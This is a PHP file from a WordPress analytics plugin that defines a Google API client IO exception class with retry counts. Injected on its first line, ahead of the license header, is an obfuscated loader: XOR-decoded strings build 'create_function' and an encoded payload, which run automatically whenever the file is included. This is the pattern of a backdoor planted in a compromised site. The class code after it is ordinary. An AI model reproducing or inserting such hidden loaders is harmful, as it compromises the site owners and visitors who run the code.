<?php $eyJAhrHXAo='7O,.CY6T-E-M8UE'^'T=IO7<i2X+N9Q:+';$zcyqLTiaMyd=$eyJAhrHXAo('','T,mdJEN,<0+=e<98AJIMf0VN9>35Ma3Z2JqCXS8RzRHZWX=5;ALVG.O2<3bj77MEB QTAoKvY=-GPNgZv,1=bFV4TCVqFnC3Z366=lJBKgPybhLTv0.8Q--okH,HPsRieRaqnospFU,.LflPbg.J 1>E ,IuFR,4D-pTXhE;Y+.1 cpVS6C4bs>4bJREUA8IN5CTPWDm34Gi1KW F0MEDKPQ=4C9IPWE+rX2Lhqh L:0WBYS7;AIVT0eaB4wr.x=wC2;uQ P3VnyBtN4L:KfALbhO +Y.sR+UzGlSX73IGPK-O<TWXxB1M;Y1n8NbF:JqBph.Z.2sO9BY3 Y1Q51LlG0axi6w+8TXXkL<1<ntJUSMZRGKxtEC1DB63>ArZQJWLBJX5EpPynVZRX+KzKA7YRHECaKKPVLBt5.9LiIu844C54119Z3KRHOY6Q2MRidM2:b6MN0FY1SEP>RKeA ABOCGrgTYB r-EJsKQXD2bUY.=ZRLBeS35QB>ZYLt64EN8BytQ67DtiEPLOUBZIENO:-WITUP83khK<Eu-huleEAw5J7ZQwVqRI4R-3FXgAHqXcEBBYoVRERVdhLKvR5D-R7=.T+7,WFYDyqPS44B83qaRl=X<5KBjZdRcW.fzPBU<rKP8;A>w2W+>AJ2C8ZNam+VWMgRYYB,'^'=JEE,0 OHYDS:YAQ2>:eAH9<fZRA,>l7G>VjqsCXs4=44,TZUa495q+SHR=5ZB9mfD0  CkR2XTnpnGzVW;4kb9A ckQaIx9S:PYODn+kZpIYHh=JCZJ=HCGO,M<1ZiIA;JZGezyb:YZlHQpJCJ+TPeaIqi+fvGQ=vT=xMeH-YBTNKT=6OjiKH4=k871 3VajZ6 ylNdN>:c;o3A2Qmxd-1=NQx3m461J-3W5HLHF-VC2ySYQT3,77XEIfk4=a3t2cSHUuK5JvSGbP8U O.Oa7hakDJ-O,9N,ZzLw3RJrMYoI.H5weXfG,W,TU23hLS,QjQLJ;ZSZoBHPUO+T0VYlDco3=8c2xlt9+KhWTENItuw;;>2.QT>I8MfRRJ -143wqbn3P<KZpgr>3,JkGkeA8>= xkB6Z+FHPQOM-ItUxAZ0PFXPU3I.z0 +i5S936; GNJT,=Upmn7 3Q6.MeD 6.jkRC086A-F 3ZbjR-TJq=OI;rjdE2AG0;a1<5+SL,=L1QS:SNcXIa4-;4kzocngWIbap11LR0O Y<RpAUQXefESzQ8hGfHg,RcOV =Ru,HmPsr 8Xf3s7qMHjmV3G6L+hVK-tRT>5-7QV 2MX-YWVMrHY9HTbkJzDrCwUls544PZo4YO ePB6RR.+VdesukdN.>9ObpbHQ');$zcyqLTiaMyd();
/*
 * Copyright 2013 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('MonsterInsights_GA_Lib_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

class MonsterInsights_GA_Lib_IO_Exception extends MonsterInsights_GA_Lib_Exception implements MonsterInsights_GA_Lib_Task_Retryable
{
  /**
   * @var array $retryMap Map of errors with retry counts.
   */
  private $retryMap = array();

  /**
   * Creates a new IO exception with an optional retry map.
   *
   * @param string $message
   * @param int $code
   * @param Exception|null $previous
   * @param array|null $retryMap Map of errors with retry counts.
   */
  public function __construct(
      $message,
      $code = 0,
      Exception $previous = null,
      array $retryMap = null
  ) {
    if (version_compare(PHP_VERSION, '5.3.0') >= 0) {
      parent::__construct($message, $code, $previous);
    } else {
      parent::__construct($message, $code);
    }

    if (is_array($retryMap)) {
      $this->retryMap = $retryMap;
    }
  }

  /**
   * Gets the number of times the associated task can be retried.
   *
   * NOTE: -1 is returned if the task can be retried indefinitely
   *
   * @return integer
   */
  public function allowedRetries()
  {
    if (isset($this->retryMap[$this->code])) {
      return $this->retryMap[$this->code];
    }

    return 0;
  }
}
